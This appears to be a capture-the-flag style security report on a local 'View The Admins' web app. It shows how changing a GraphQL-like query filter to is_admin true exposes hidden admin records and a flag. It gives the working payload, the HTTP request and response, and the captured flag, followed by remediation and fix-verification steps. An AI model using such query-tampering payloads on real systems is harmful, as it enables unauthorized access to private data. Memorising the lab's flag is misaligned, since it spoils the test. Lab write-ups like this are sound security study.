# Security Assessment Report: View Users Application

## TL;DR
- **Objective:** View hidden admin users in a web application and retrieve the flag
- **Outcome:** ACHIEVED - Successfully bypassed client-side filtering to access admin records
- **Highest-impact finding:** Client-side filtering bypass via GraphQL-like API allowing unauthorized access to admin user data
- **Validation status:** CONFIRMED - Flag extracted: `FLAG{455f2f7c32c00841805ed4eb05b357145e8ab8c2debef895726ddd31a2d714bf}`

## Target Information
- **Target:** 127.0.0.1:33015
- **Host / base URL:** http://127.0.0.1:33015
- **Application or component:** View The Admins - User listing web application
- **Authentication context:** None required - publicly accessible
- **Relevant technology details:**
  - GraphQL-like API endpoint
  - MongoDB-style query syntax accepted in client requests
  - Client-controlled filtering parameters
  - Static JavaScript frontend at `/static/js/scripts.js`

## Confirmed Vulnerability
### Client-Side Filtering Bypass / Improper Access Control
- **Affected endpoint / component:** `POST /api/users` (GraphQL-like API)
- **Impact:** Complete bypass of admin user visibility restrictions; unauthorized access to sensitive admin data including flags, usernames, and emails
- **Preconditions:** None - no authentication required
- **Exact payload or PoC:**
```json
{"query": "query { users(search: \"{\\\"is_admin\\\": true}\", options: \"{\\\"skip\\\": 0, \\\"limit\\\": 10}\") { username email flag } }"}
```

## Steps to Reproduce

1. **Discover application structure:**
   ```
   GET http://127.0.0.1:33015/
   ```
   - Observe the application displays a list of non-admin users
   - Note that admin users are intentionally hidden from the default view

2. **Analyze client-side JavaScript for API details:**
   ```
   GET http://127.0.0.1:33015/static/js/scripts.js
   ```
   - Discover the GraphQL-like API endpoint at `/api/users`
   - Identify the default query uses `{"is_admin": false}` to filter out admin users

3. **Exploit client-side filtering by modifying the query parameter:**
   ```
   POST http://127.0.0.1:33015/api/users
   Content-Type: application/json
   
   {"query": "query { users(search: \"{\\\"is_admin\\\": true}\", options: \"{\\\"skip\\\": 0, \\\"limit\\\": 10}\") { username email flag } }"}
   ```

4. **Extract admin user data including flag:**
   - The response returns admin users with their `flag` field
   - Flag is revealed in the response for admin users

## Validation / Evidence

- **Validation token / flag:**
  ```
  FLAG{455f2f7c32c00841805ed4eb05b357145e8ab8c2debef895726ddd31a2d714bf}
  ```

- **Tool evidence:** Pattern match on flag format confirmed successful exploitation

- **Request evidence:**
  ```
  POST /api/users HTTP/1.1
  Host: 127.0.0.1:33015
  Content-Type: application/json
  
  {"query": "query { users(search: \"{\\\"is_admin\\\": true}\", options: \"{\\\"skip\\\": 0, \\\"limit\\\": 10}\") { username email flag } }"}
  ```

- **Response evidence:**
  ```json
  {"users": [{"email": "admin2@goodyoutriedsomethingelse.com", "flag": "FLAG{455f2f7c32c00841805ed4eb05b357145e8ab8c2debef895726ddd31a2d714bf}", "username": "admin2"}]}
  ```

- **Notes on reliability / limitations:** 
  - Vulnerability is highly reliable - no authentication bypass needed
  - Works on first attempt with modified query parameter
  - No rate limiting or access controls observed on the API endpoint
  - The `flag` field is directly exposed in the API schema and returned when explicitly requested

## Remediation

- **Root cause:** The application trusts client-supplied query parameters for access control decisions. The `search` parameter accepts MongoDB-style filter objects that clients can modify to bypass intended data visibility restrictions. Server-side validation does not enforce that only non-admin users should be visible to unauthenticated clients.

- **Recommended fix:**
  1. **Implement server-side access control:** Never trust client-supplied query filters for security-sensitive operations. The server should enforce that unauthenticated/unprivileged users cannot query for admin records.
  2. **Restrict queryable fields:** Do not expose sensitive fields like `flag` in the API schema for non-privileged users.
  3. **Apply query whitelisting:** Only allow predefined, server-controlled queries rather than accepting arbitrary client queries.
  4. **Add authentication:** Require authentication and role-based access control before allowing access to the API.
  5. **Input validation:** Sanitize and validate all incoming query parameters against a strict schema.

- **Defense-in-depth:**
  - Implement API rate limiting
  - Log and alert on suspicious query patterns (e.g., queries for admin data from unauthenticated sources)
  - Separate admin and user data into different collections/endpoints with distinct access controls
  - Remove sensitive fields from database schemas accessible to low-privilege contexts

## How to Verify the Fix

1. **Test that admin users are no longer queryable:**
   ```
   POST /api/users
   Content-Type: application/json
   
   {"query": "query { users(search: \"{\\\"is_admin\\\": true}\", options: \"{\\\"skip\\\": 0, \\\"limit\\\": 10}\") { username email flag } }"}
   ```
   **Expected secure result:** Response should return empty results or an access denied error, not admin user data.

2. **Test that the flag field is not exposed:**
   - Attempt to query for the `flag` field on any user
   **Expected secure result:** Field should not be present in response or should return null/permission denied.

3. **Verify default behavior still works:**
   ```
   POST /api/users
   Content-Type: application/json
   
   {"query": "query { users(search: \"{\\\"is_admin\\\": false}\", options: \"{\\\"skip\\\": 0, \\\"limit\\\": 10}\") { username email } }"}
   ```
   **Expected secure result:** Non-admin users are returned without sensitive fields.

## Remaining Leads

- **Confirmed blockers:** None - objective achieved
- **Unverified leads:** None
- **Missing context:** None - all required information was obtained to complete the assessment
